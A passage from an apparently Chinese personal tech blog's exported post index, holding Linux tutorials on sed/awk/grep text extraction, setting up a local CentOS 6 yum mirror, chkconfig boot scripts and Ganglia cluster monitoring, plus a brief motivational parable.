&#39;s#oldboy#oldgirl#g&#39; oldboy.txt参数：-i.bak 表示修改文件的时候，先保存为oldboy.txt.bak注：sed 使用-i参数并且标记完修改之前先备份的时候，如果要使用正则表达式，需要把sed -r参数放到前面，这样：sed -ri.bak &#39;s#old(b)oy#oldgirl\\1#g&#39; oldboy.txt修改oldoy为oldgirl,同时把b保留下来修改结果：my blog is http:&#x2F;&#x2F;oldgirlb.blog.51cto.com SED/GREP使用正则提取/ETC/HOSTS权限123456789101112131415161718方法1： [root@oldboyedu37-nb 20170118]# stat &#x2F;etc&#x2F;hosts|sed -n &#39;4p&#39;|sed &#39;s#^.*(0##g&#39; |sed &#39;s#&#x2F;.*$##g&#39;644正则方法2：[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts | sed -n &#39;4p&#39; |sed -r &#39;s#^.* \\(0(.*)\\&#x2F;.*$#\\1#g&#39;644&#x2F;-rw-r--r--) Uid: ( 0&#x2F; root) Gid: ( 0[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts | sed -n &#39;4p&#39; |sed -r &#39;s#^.* \\(0(.*)\\&#x2F;-.*$#\\1#g&#39;644方法3：[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts|sed -nr &#39;4s#^.*\\(0(.*)&#x2F;-.*$#\\1#gp&#39; 644方法4: [root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |grep &quot;Uid&quot; |egrep -o &quot;[0-9]&#123;4&#125;&quot;0644 sed使用1234567891011## 查找以f或m结尾的行[root@server1 oldboy]# sed -n &#39;&#x2F;f$\\|m$&#x2F;p&#39; oldboy2.txt my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.comoldboy f## 查找除了以f或m结尾的行[root@server1 oldboy]# sed -n &#39;&#x2F;f$\\|m$&#x2F;!p&#39; oldboy2.txt I am oldboy teacher!I teach linux.I like badminton ball ,billiard ball and chinese chess!our site is http:&#x2F;&#x2F;www.etiantian.orgmy qq num is 49000448. EGREP/AWK取消某个文件的空行1234567891011121314151617方法1：[root@oldboy202 ~]# egrep -v &quot;^$&quot; oldboy.txt 方法2：[root@oldboy202 ~]# sed &#39;&#x2F;^$&#x2F;d&#39; oldboy.txt方法3：[root@oldboy202 ~]# awk &#39;!&#x2F;^$&#x2F;&#39; oldboy.txtI am oldgirlb teacher!I teach linux.I like badminton ball ,billiard ball and chinese chess!方法4：[root@oldboy202 ~]# grep &#39;^.&#39; oldboy.txt方法5:[root@oldboy202 ~]# grep &quot;.$&quot; oldboy.txt EGREP/AWK 取出文本前两列1234567891011[root@oldboy202 ~]# cat ett.txt |egrep &quot;ol+dbo+y&quot; oldboyolldboooy[root@oldboy202 ~]# cat ett.txt |egrep &quot;^o&quot;oldboyolldboooy[root@oldboy202 ~]# cat ett.txt |awk &#39;&#x2F;ol+dbo+y&#x2F;&#39;oldboyolldboooy SED与AWK提取文件权限1234567891011121314151617181920##sed提取&#x2F;etc&#x2F;hosts权限[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |sed -n &#39;4p&#39; |sed -r &#39;s#^.*\\(0(.*)&#x2F;-.*$#\\1#g&#39;644 sed -n &#39;4p&#39; 取第4行其中（.*）是我要提取的内容，所以需要括起来，后面使用\\1提取##awk提取&#x2F;etc&#x2F;hosts权限[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |awk &#39;NR&#x3D;&#x3D;4&#39;|awk -F &quot;[(&#x2F;]&quot; &#39;&#123;print $1&#125;&#39;Access: #以（或&#x2F;来切割，然后使用&#123;print $n&#125; 提取对应列[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |awk &#39;NR&#x3D;&#x3D;4&#39;|awk -F &quot;[(&#x2F;]&quot; &#39;&#123;print $2&#125;&#39;0644#以0或&#x2F;来切割，然后使用&#123;print $n&#125; 提取对应列[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |awk &#39;NR&#x3D;&#x3D;4&#39; |awk -F &quot;[0&#x2F;]&quot; &#39;&#123;print $2&#125;&#39;644awk &#39;NR&#x3D;&#x3D;4&#39; 取第4行awk -F 切割[root@oldboyedu37-nb ~]# stat -c %a &#x2F;etc&#x2F;hosts 644[root@oldboyedu37-nb ~]# stat -c%a &#x2F;etc&#x2F;hosts 644 123456789101112131415sed 使用-n参数来过滤出某行[root@oldboyedu37-nb ~]# stat &#x2F;etc&#x2F;hosts |sed -n &#39;4p&#39;Access: (0644&#x2F;-rw-r--r--) Uid: ( 0&#x2F; root) Gid: ( 0&#x2F; root)使用cut来提取并显示&#x2F;etc&#x2F;hosts权限[root@oldboyedu37-nb ~]# stat &#x2F;etc&#x2F;hosts |sed -n &#39;4p&#39;|cut -d &quot;(&quot; -f20644&#x2F;-rw-r--r--) Uid: cut使用-d参数以“（” 分割，提取第二列[root@oldboyedu37-nb ~]# stat &#x2F;etc&#x2F;hosts |sed -n &#39;4p&#39;|cut -d &quot;(&quot; -f2|cut -d &quot;&#x2F;&quot; -f10644再以“&#x2F;”作为分割，使用-f参数提取第1列cut 切割 -d 指定一把菜刀 -f1 取第一列 -f1,5 取第一列和第五列 -f2-6 取第2列到第6列 AWK提取IP地址12345[root@oldboy202 ~]# ifconfig eth0|awk &#39;NR&#x3D;&#x3D;2&#39;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;10.0.0.202NR&#x3D;&#x3D;2 提取第二行AWK -F 切割我们要提取IP地址，所以以空格和冒号作为切割条件，最后打印输出$4的内容","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"egrep","slug":"egrep","permalink":"https://garywu520.github.io/tags/egrep/"},{"name":"sed","slug":"sed","permalink":"https://garywu520.github.io/tags/sed/"},{"name":"awk","slug":"awk","permalink":"https://garywu520.github.io/tags/awk/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://garywu520.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"搭建在线Yum源-CentOS6","slug":"搭建在线Yum源","date":"2017-06-16T06:05:18.000Z","updated":"2017-06-16T09:13:17.681Z","comments":true,"path":"2017/06/16/搭建在线Yum源/","link":"","permalink":"https://garywu520.github.io/2017/06/16/%E6%90%AD%E5%BB%BA%E5%9C%A8%E7%BA%BFYum%E6%BA%90/","excerpt":"尽管有很多的免费镜像提供Yum源服务，但还是有必要建立自己的Yum源服务器，主要出于以下几点考虑： 网络速度：访问互联网可能比较慢 节省带宽：如果有大量的服务器，假设自己的yum源可以有效节省互联网带宽 联网限制：对于有些内网服务器，不能连接到互联网","text":"尽管有很多的免费镜像提供Yum源服务，但还是有必要建立自己的Yum源服务器，主要出于以下几点考虑： 网络速度：访问互联网可能比较慢 节省带宽：如果有大量的服务器，假设自己的yum源可以有效节省互联网带宽 联网限制：对于有些内网服务器，不能连接到互联网 Yum服务端部署编译安装Nginx1234567891011121314151617181920212223242526272829303132333435361. 获取Nginxs软件包 wget http:&#x2F;&#x2F;tengine.taobao.org&#x2F;download&#x2F;tengine-2.2.0.tar.gz 2. 解压安装包并进入安装文件夹 tar xf tengine-2.2.0.tar.gz &amp;&amp; cd tengine-2.2.03. 安装编译需要的依赖包 yum install gcc openssl-devel pcre-devel zlib-devel -y 4. 编译安装Nginx .&#x2F;configure &amp;&amp; make &amp;&amp; make install5. 配置Nginx开机自启动 cd &#x2F;etc&#x2F;init.d&#x2F; cat &gt;&gt; nginx &lt;&lt;EOF #!&#x2F;bin&#x2F;bash #chkconfig: 2345 70 30 #description: #processname: nginx &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx chmod +x nginx chkconfig --add nginx chkconfig nginx on chkconfig --list |grep nginx 6. 配置Nginx文件 vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf location &#x2F; &#123; root &#x2F;rpm; autoindex on; #root html; #index index.html index.htm; &#125; 配置欲同步的网络源12345678910111213141516171、备份CentOS 自带yum源 mv &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.backup2、改为国内aliyun yum源 wget -O &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;Centos-6.repo 注：当然，此处也可以直接使用epel-realease源（推荐原因: 软件更齐全） yum install -y epel-realease3、删除yum源缓存 yum clear all4、创建yum源缓存 yum makecache5、查看yum源repo列表 yum repolist 同步网络yum源123456789101112131. 切换到网站根目录 cd &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F; mkdir .&#x2F;rpm &amp;&amp; cd .&#x2F;rpm 进入rpm网站根目录 2. 安装yum工具包 yum -y install yum-utils3. 同步网络yum源 reposync -r base 4. 创建yum源的repo配置文件 yum install -y createrepo createrepo base&#x2F;Packages&#x2F; 网页访问部署完成的yum源123&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginxhttp:&#x2F;&#x2F;192.168.1.10 确认网页访问正常 客户端配置yum源1234567891011121314151617181920212223242526271. 备份CentOS自带yum源 mv &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.backup2. 拷贝并编辑Base cp &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.bak vim &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo 修改baseurl为以下实际本地yum地址 [base] baseurl&#x3D;http:&#x2F;&#x2F;192.168.1.10&#x2F;base&#x2F;Packages&#x2F;$basearch&#x2F; [expel] baseurl&#x3D;http:&#x2F;&#x2F;192.168.1.10&#x2F;epel&#x2F;$basearch&#x2F; [updates] baseurl&#x3D;http:&#x2F;&#x2F;192.168.1.10&#x2F;updates&#x2F;Packages&#x2F;$basearch&#x2F; 注：上面的base 、expel和updates等需要有对应的目录。3. 删除yum源缓存 yum clean all4. 创建yum源缓存 yum makecache 5. 查看yum源repo列表 yum repolist 客户端yum安装软件测试1yum install -y ntpdate 技术文章：参考","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"CentOS6","slug":"CentOS6","permalink":"https://garywu520.github.io/tags/CentOS6/"},{"name":"Yum源","slug":"Yum源","permalink":"https://garywu520.github.io/tags/Yum%E6%BA%90/"}]},{"title":"chkconfig自定义开机脚本-实现","slug":"chkconfig自定义开机脚本-实现","date":"2017-06-15T10:57:28.000Z","updated":"2017-06-15T11:05:12.663Z","comments":true,"path":"2017/06/15/chkconfig自定义开机脚本-实现/","link":"","permalink":"https://garywu520.github.io/2017/06/15/chkconfig%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%80%E6%9C%BA%E8%84%9A%E6%9C%AC-%E5%AE%9E%E7%8E%B0/","excerpt":"很多时候因为版本要求等原因需要编译安装某些软件，而这些软件安装后，需要使用绝对路径启动服务。 而我们就来讲讲如何基于chkconfig实现简单的开机自启动脚本。","text":"很多时候因为版本要求等原因需要编译安装某些软件，而这些软件安装后，需要使用绝对路径启动服务。 而我们就来讲讲如何基于chkconfig实现简单的开机自启动脚本。 例如：smokeping 脚本内容（在/etc/init.d目录下新建） 1234567#!&#x2F;bin&#x2F;bash#chkconfig: 2345 70 30#description: #关于脚本的简短描述#processname: smokeping&#x2F;usr&#x2F;local&#x2F;smokeping&#x2F;bin&#x2F;smokeping #服务启动的绝对命令路径 ​ 加入服务开机启动 123chkconfig --add smokepingchkconfig smokeping onchkconfig --list |grep smokeping ​","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"脚本","slug":"脚本","permalink":"https://garywu520.github.io/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"大数据Ganglia集群监控-CentOS6","slug":"大数据Ganglia集群监控-CentOS6","date":"2017-06-14T07:26:39.000Z","updated":"2017-07-04T11:02:54.065Z","comments":true,"path":"2017/06/14/大数据Ganglia集群监控-CentOS6/","link":"","permalink":"https://garywu520.github.io/2017/06/14/%E5%A4%A7%E6%95%B0%E6%8D%AEGanglia%E9%9B%86%E7%BE%A4%E7%9B%91%E6%8E%A7-CentOS6/","excerpt":"Ganglia单群集部署Ganglia集群监控 Ganglia是由UC Berkeley发起的一个开源监控项目，设计用于监控数以千几的节点。每台服务器都运行一个收集和发送监控数据名为gmond的守护进程。它将从操作系统和指定主机中收集。 接收所有监控数据的主机可以显示这些数据并且可以将这些数据的精简表单传递到层次结构中。正因为有这种层次架构模式，使ganglia可以实现良好的扩展。Gmond带来的系统负载非常小，这使得它成为集群中各个服务器上运行一段代码而不会影响用户性能。","text":"Ganglia单群集部署Ganglia集群监控 Ganglia是由UC Berkeley发起的一个开源监控项目，设计用于监控数以千几的节点。每台服务器都运行一个收集和发送监控数据名为gmond的守护进程。它将从操作系统和指定主机中收集。 接收所有监控数据的主机可以显示这些数据并且可以将这些数据的精简表单传递到层次结构中。正因为有这种层次架构模式，使ganglia可以实现良好的扩展。Gmond带来的系统负载非常小，这使得它成为集群中各个服务器上运行一段代码而不会影响用户性能。 Ganglia主要用来监控系统性能的软件，通过曲线很容易见到每个节点的工作状态，对合理调整，分配系统资源，提高系统整体性能起到重要作用，支持浏览器方式访问，但不能监控节点硬件技术指标。Ganglia是分布式的监控系统。 Ganglia的组件 ganglia由三个组件构成 gmond :（client）是一个守护进程，他运行在每一个需要监测的节点上，收集监测统计，发送和接受在同一个组播或单播通道上的统计信息。 gmetad:（server端）也是一个守护进程，他定期检查gmonds，从那里拉取数据，并将他们的指标存储在RRD存储引擎中。他可以查询多个集群并聚合指标，然后生成并在用户界面的web前端展示。 ganglia-web :（server端）顾名思义，他应该安装在有gmetad运行的机器上，以便读取RRD文件。 Ganglia 工作模式 Ganglia收集数据可以工作在单播或多播模式下，默认为多播模式单播：发送自己收集到的监控数据到特定的一台或几台服务器上，可以跨网段。多播：发送自己收集到的监控数据到同一网段所有的服务器上，同时收集同一网段的所有服务器发送过来的监控数据。因为是以广播包的形式发送，因此需要在同一网段内，但同一网段内，又可以定义不同的发送通道。 工作模式：图例 环境结构说明 现在有3台机器用来测试搭建Ganglia监控集群环境，采用多播的方式来监控各机器运行情况。 我以server-25为主节点（它上面部署监控服务端） 首先，在server-25 hosts 中配置主机信息。目的是为了读取各机器的主机名而不是IP。 1234567cat &gt;&gt; &#x2F;etc&#x2F;hosts &lt;&lt; EOF192.168.0.25 server-25192.168.0.26 client1-26192.168.0.27 client2-27EOF 更换epel源(推荐) 该epel源内置大量优秀的软件，如果默认的yum源找不到你要安装的软件，那么这个epel源很适合你。 12安装epel源(服务端&#x2F;客户端运行)yum update &amp;&amp; yum install epel-release 服务端安装123456789101112安装gmetad（服务端运行）yum install -y ganglia-gmetad ganglia-devel 安装依赖图形软件rrdtoolyum erase rrdtool -yyum install -y rrdtool安装httpd服务器(用于搭建php网页服务器)yum install -y httpd安装ganglia-web及phpyum install -y ganglia-web php 客户端安装12安装gmond(所有客户端运行)yum install -y ganglia-gmond 软件安装目录说明12345ganglia配置文件目录：&#x2F;etc&#x2F;gangliarrd数据库存放目录：&#x2F;var&#x2F;lib&#x2F;ganglia&#x2F;rrdshttpd主站点目录：&#x2F;var&#x2F;www&#x2F;htmlganglia-web安装目录：&#x2F;usr&#x2F;share&#x2F;gangliaganglia-web配置目录：&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ganglia.conf 配置服务端(gmetad)1234567891011将ganglia-web的站点目录连接到httpd主站点目录ln -s &#x2F;usr&#x2F;share&#x2F;ganglia&#x2F; &#x2F;var&#x2F;www&#x2F;html&#x2F;修改httpd主站点目录下ganglia站点目录的访问权限chown -R apache:apache &#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia修改ganglia站点目录访问权限属主属组为apachechmod -R 755 &#x2F;var&#x2F;www&#x2F;html&#x2F;ganglia修改rrd数据库存放目录访问权限属主属组为gangliachown -R ganglia:ganglia &#x2F;var&#x2F;lib&#x2F;ganglia&#x2F;rrds 12345678910111213修改ganglia-web的访问权限cat &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;ganglia.conf Alias &#x2F;ganglia &#x2F;usr&#x2F;share&#x2F;ganglia &lt;Location &#x2F;ganglia&gt; Order deny,allow Deny from all #Allow from 127.0.0.1 #Allow from ::1 allow from all # Allow from .example.com &lt;&#x2F;Location&gt; 配置/etc/ganglia/gmetad.conf 1234567891011121314151617181920212223data_source &quot;hadoop_cluster_yarn&quot; 30 host1:8649 host2:8649（1）data_source参数定义了集群名字，以及集群中的节点。由于采用multicast模式，每台gmond节点都有本Cluster1内节点机器的所有监控数据，因此不需要把所有节点写入data_source中。建议写入不低于2个，在host1节点死机的时候，会自动找host2节点取数据。(2)中间的30，单位是秒。意思是30s轮询向后面的node查询信息然后交给rrd画图。如果不加30参数，默认15s一个轮询。setuid_username ganglia 该用户名需要与&#x2F;var&#x2F;lib&#x2F;ganglia&#x2F;rrds&#x2F;属主保持一致，这样能确保读写没问题。否则启动gmetad会出现：gmetad dead but subsys locked的错误xml_port 8651xml_port定义了一个收集数据汇总的交互端口，如果不指定，默认是8651，可以通过telnet这个端口得到监控管理端收集到的客户端的所有数据。interactive_port 8652interactive_port 定义了Web端获取数据的端口，这个端口在配置Ganglia的web监控界面时需要指定。rrd_rootdir &quot;&#x2F;var&#x2F;lib&#x2F;ganglia&#x2F;rrds&quot;rrd_rootdir参数定义了rrd数据库的存放路径，gmetad收集到监控数据后，会更新到该目录下的对应的rrd数据库中。gridname &quot;Hadoop&quot; 定义grad名称，该名称会显示在Web界面中上面通过data_source参数定义了一个监控集群，如果要监控多个应用系统，可以通过如下方式定义：data_source &quot;my cluster&quot; 10 localhost my.machine.edu:8649 1.2.3.5:8655data_source &quot;my grid&quot; 50 1.3.4.7:8655 grid.org:8651 grid-backup.org:8651data_source &quot;another source&quot; 1.3.4.7:8655 1.3.4.8在定义集群节点的时候，可以采用主机名、IP地址等形式，也可以加端口，如果不加端口的话，默认是8649端口，同时可以设定采集数据的频率，如上面的“10 localhost、50 1.3.4.7:8655”等，分别表示每隔10秒钟、50秒钟采集一次数据。 12345case_sensitive_hostnames 1在gmetad之前版本中，RRD文件区分主机名大小写，但是现在已经有所改变。如果希望继续使用Ganglia 3.2之前版本创建的RRD文件，将该值设置为1。注意：如果该参数非1，将会导致“浏览器访问ganglia出现各个节点的表格显示“ganglia no matching metrics detected”错误，内页不出图。 配置客户端(gmond)12配置文件vim &#x2F;etc&#x2F;ganglia&#x2F;gmond.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#global部分globals &#123; daemonize &#x3D; yes #以后台的方式运行 setuid &#x3D; yes user &#x3D; ganglia #运行gmond的用户 debug_level &#x3D; 0 #调试级别。如果有问题，可以修改值为10看启动信息 max_udp_msg_len &#x3D; 1472 mute &#x3D; no #哑巴，本节点将不会再广播任何自己收集到的数据到网络上 deaf &#x3D; no #聋子，本节点将不再接收任何其他节点广播的数据包 allow_extra_data &#x3D; yes host_dmax &#x3D; 0 &#x2F;*secs *&#x2F; cleanup_threshold &#x3D; 300 &#x2F;*secs *&#x2F; gexec &#x3D; no #是否使用gexec send_metadata_interval &#x3D; 0&#125; #cluster部分cluster &#123; name &#x3D; &quot;hadoop_cluster_yarn&quot; #本节点属于哪个cluster，该值需要和服务端配置文件data_source一致。 owner &#x3D; &quot;apache&quot; #谁是该节点的所有者 latlong &#x3D; &quot;unspecified&quot; #类似于地球上的坐标，经度、纬度？ url &#x3D; &quot;unspecified&quot;&#125;#host部分host &#123; location &#x3D; &quot;unspecified&quot; #显示，可以起一个描述机器位置的信息 &#125; #udp send部分udp_send_channel &#123; #udp包的发送通道 mcast_join &#x3D; 239.2.11.71 #多播。其中239.2.11.71是保留地址，官方默认要求，无需修改 #host &#x3D; 192.168.0.26 #如果使用单播模式（定点发定点收），不建议 #单播需要改为比如 host &#x3D; 192.168.0.26(指定ganglia客户端 IP地址)，单播模式下也可以配置多个udp_send_channel port &#x3D; 8649 #监听端口 ttl &#x3D; 1&#125; udp_recv_channel &#123; #接收udp包配置 mcast_join &#x3D; 239.2.11.71 #同样工作在239.2.11.71通道下 port &#x3D; 8649 #监听端口 bind &#x3D; 239.2.11.71 #绑定&#125; tcp_accept_channel &#123; port &#x3D; 8649 #通过tcp协议监听的端口，远端可以通过链接8649端口得到监控数据&#125; 管理ganglia12345678所有配置操作完成后，即可启动ganglia服务了，首先在监控管理端启动gmetad服务：&#x2F;etc&#x2F;init.d&#x2F;gmetad start接着启动apache的web服务：&#x2F;etc&#x2F;init.d&#x2F;httpd start最后在每个客户端启动gmond服务：&#x2F;etc&#x2F;init.d&#x2F;gmond start 你可能会遇到的问题12345671. 服务器端启动ganglia后，查看状态出现错误&#x2F;etc&#x2F;init.d&#x2F;gmetad statusgmetad dead but subsys lockedcat &#x2F;etc&#x2F;ganglia&#x2F;gmetad.confsetuid_username ganglia 该用户名需要与&#x2F;var&#x2F;lib&#x2F;ganglia&#x2F;rrds&#x2F;属主保持一致，这样能确保读写没问题。否则启动gmetad会出现：gmetad dead but subsys locked的错误 12345672. Web访问ganglia: http:&#x2F;&#x2F;10.0.10.25&#x2F;ganglia&#x2F;出现错误：There was an error collecting ganglia data (127.0.0.1:8652): fsockopen error关闭selinux！关闭selinux！关闭selinux！重要事情说三遍！！！ 123453. 由于系统时间不对导致的问题cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtimeyum install -y ntpdatentpdate time.windows.com&#x2F;etc&#x2F;init.d&#x2F;gmetad restart debug排错12345善于使用软件自身提供的debug功能来查找原因vim &#x2F;etc&#x2F;ganglia&#x2F;gmetad.confdebug_level 10 &#x2F;&#x2F;启用该参数，重启服务后会打印运行log到屏幕 访问 http://192.168.0.25/ganglia Ganglia多个群集-部署（多播模式） 多个群集架构图：图例 环境： ClusterOne节点上有4个节点: node0.c1 , node1.c1 , node2.c1 , node3.c1 ClusterTwo节点上有4个节点: node0.c2 , node1.c2 , node2.c2 , node3.c2 ClusterThree节点上有4个节点：node0.c3 , node1.c3 , node2.c3 , node3.c3 ClusterOne上面的node0.c1部署（node1.c1 , node2.c1 , node3.c1配置相同） 1234567891011121314151617181920212223# &#x2F;etc&#x2F;gmond.conf - on ClusterOnecluster &#123; name &#x3D; &quot;ClusterOne&quot; &#x2F;&#x2F;这个通道名字不能与其他群集重复，ClusterOne集群端口也要确保唯一，此处是：8661 owner &#x3D; &quot;unspecified&quot; latlong &#x3D; &quot;unspecified&quot; url &#x3D; &quot;unspecified&quot;&#125;udp_send_channel &#123; mcast_join &#x3D; 239.2.11.71 port &#x3D; 8661 ttl &#x3D; 1&#125;udp_recv_channel &#123; mcast_join &#x3D; 239.2.11.71 port &#x3D; 8661 bind &#x3D; 239.2.11.71&#125;tcp_accept_channel &#123; port &#x3D; 8661&#125; ​ ClusterTwo上面的node0.c2部署（node1.c2 , node2.c2 , node3.c2配置相同） 1234567891011121314151617181920212223# &#x2F;etc&#x2F;gmond.conf - on ClusterTwocluster &#123; name &#x3D; &quot;ClusterTwo&quot; &#x2F;&#x2F;这个通道名字不能与其他群集重复，ClusterOne集群端口也要确保唯一，此处是：8662 owner &#x3D; &quot;unspecified&quot; latlong &#x3D; &quot;unspecified&quot; url &#x3D; &quot;unspecified&quot;&#125;udp_send_channel &#123; mcast_join &#x3D; 239.2.11.71 port &#x3D; 8662 ttl &#x3D; 1&#125;udp_recv_channel &#123; mcast_join &#x3D; 239.2.11.71 port &#x3D; 8662 bind &#x3D; 239.2.11.71&#125;tcp_accept_channel &#123; port &#x3D; 8662&#125; ​ ClusterThree上面的node0.c3部署（node1.c3 , node2.c3 , node3.c3配置相同） 1234567891011121314151617181920212223# &#x2F;etc&#x2F;gmond.conf - on ClusterThreecluster &#123; name &#x3D; &quot;ClusterThree&quot; &#x2F;&#x2F;这个通道名字不能与其他群集重复，ClusterOne集群端口也要确保唯一，此处是：8663 owner &#x3D; &quot;unspecified&quot; latlong &#x3D; &quot;unspecified&quot; url &#x3D; &quot;unspecified&quot;&#125;udp_send_channel &#123; mcast_join &#x3D; 239.2.11.71 port &#x3D; 8663 ttl &#x3D; 1&#125;udp_recv_channel &#123; mcast_join &#x3D; 239.2.11.71 port &#x3D; 8663 bind &#x3D; 239.2.11.71&#125;tcp_accept_channel &#123; port &#x3D; 8663&#125; 定义完node节点，最后配置ganglia服务端/etc/ganglia/gmetad.conf 123456# &#x2F;etc&#x2F;gmetad.conf data_source &quot;ClusterOne&quot; 30 node0.c1:8661 node1.c1:8661data_source &quot;ClusterTwo&quot; 30 node0.c2:8662 node1.c2:8662data_source &quot;ClusterThree&quot; 30 node3.c2:8663 node1.c3:8663注：后面每个通道至少要写2个node信息，如果一个节点挂掉，另一个节点仍然能够提供本通道（cluster name）的统计信息gmetad，因为gmond节点在配置的UDP通道内交换统计信息。 最后重启服务端与node节点的服务即可。有问题开启debug 需求：服务器复用，Ganglia分别监控同1台机器 需求：假如一台服务器上面同时安装了HDFS、Yarn和Spark，让Ganglia分别监控这台机器。 目的：是让大数据人员很清楚每台机器上面具体有什么业务。 方案：在客户端启用多个gmond进程。 比如我的案例：默认配置文件gmond我定义为HDFS群集，复制gmond.conf为gmond-hdfs.conf， name=hdfs port=8649(默认)Yarn群集：复制gmond.conf并改名为gmond-yarn.conf，name=yarn port=8650Spark群集：复制gmond.conf并改名为gmond-spark.conf , name=spark port=8651 实施方案12345678910111213141516客户端启动多个gmond进程：启动第一个HDFS gmond进程：&#x2F;usr&#x2F;sbin&#x2F;gmond -c &#x2F;etc&#x2F;ganglia&#x2F;gmond-hdfs.conf -p &#x2F;etc&#x2F;ganglia&#x2F;gmond-hdfs.pid启动第二个yarn gmond进程：&#x2F;usr&#x2F;sbin&#x2F;gmond -c &#x2F;etc&#x2F;ganglia&#x2F;gmond-yarn.conf -p &#x2F;etc&#x2F;ganglia&#x2F;gmond-yarn.pid启动第三个spark gmond进程：&#x2F;usr&#x2F;sbin&#x2F;gmond -c &#x2F;etc&#x2F;ganglia&#x2F;gmond-spark.conf -p &#x2F;etc&#x2F;ganglia&#x2F;gmond-spark.pid如果有更多，方法类似，以此类推。注意：配置文件内多个群集区分，多个群集之间，配置文件的name与port一定要区分，否则就串了上面的启动命令最好放到脚本里面，开机一次性自启动 :) 维护1234每台机器多个gmond进程难免出现故障，可能某个gmond进程无法启动，总结为如下几点原因：1. 检查gmond进程端口是否被其他程序占用， lsof -i:86492. 删除故障的gmond pid文件重新启动对应gmond服务3. 检查gmond服务所在服务器是否已经开启selinux或iptables，根据实际情况进行端口开放。 附加：gmond命令帮助12345678910111213141516171819202122232425262728# gmond --helpgmond 3.7.2The Ganglia Monitoring Daemon (gmond) listens to the clustermessage channel, stores the data in-memory and when requestedwill output an XML description of the state of the clusterUsage: gmond [OPTIONS]... -h, --help Print help and exit -V, --version Print version and exit -c, --conf&#x3D;STRING Location of gmond configuration file (default&#x3D;&#96;&#x2F;etc&#x2F;ganglia&#x2F;gmond.conf&#39;) -l, --location&#x3D;STRING Location of this host in the cluster &#39;rack,rank,plane&#39;. (default&#x3D;&#96;0,0,0&#39;) -d, --debug&#x3D;INT Debug level. If greater than zero, daemon will stay in foreground. (default&#x3D;&#96;0&#39;) -f, --foreground Run in foreground (don&#39;t daemonize) (default&#x3D;off) -t, --default_config Print the default configuration to stdout and exit (default&#x3D;off) -m, --metrics Print the list of metrics this gmond supports (default&#x3D;off) -b, --bandwidth Calculate minimum bandwidth use for configuration (default&#x3D;off) -r, --convert&#x3D;STRING Convert a 2.5.x configuration file to the new 3.x format -p, --pid-file&#x3D;STRING Write process-id to file 最后的最后，贴下自己的测试环境Ganglia图形界面 Ganglia1: 图例 Gagnlia2: 图例","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"Ganglia","slug":"Ganglia","permalink":"https://garywu520.github.io/tags/Ganglia/"}]},{"title":"读无字书-杯子取水 ","slug":"读无字书-杯子取水","date":"2017-06-14T06:38:23.000Z","updated":"2017-06-14T06:52:54.305Z","comments":true,"path":"2017/06/14/读无字书-杯子取水/","link":"","permalink":"https://garywu520.github.io/2017/06/14/%E8%AF%BB%E6%97%A0%E5%AD%97%E4%B9%A6-%E6%9D%AF%E5%AD%90%E5%8F%96%E6%B0%B4/","excerpt":"来自《阳光心态》 两个杯子，一个大杯，一个小杯。 小杯有水，滋润万物，浇灌大地。","text":"来自《阳光心态》 两个杯子，一个大杯，一个小杯。 小杯有水，滋润万物，浇灌大地。 空了，就靠近大杯取水，小杯要处于下方，才能够接到水。 如果小杯靠近大杯时，高傲的蔑视大杯，姿态高高在上，则小杯就取不到水。 它空空而来，也会空空而去。。。 大杯也会空，大杯取水只能靠近小杯。大杯此时也要处于下方，否则也得不到水。 如果要去小杯往大杯里倒水，这时小杯子也要处于上方。 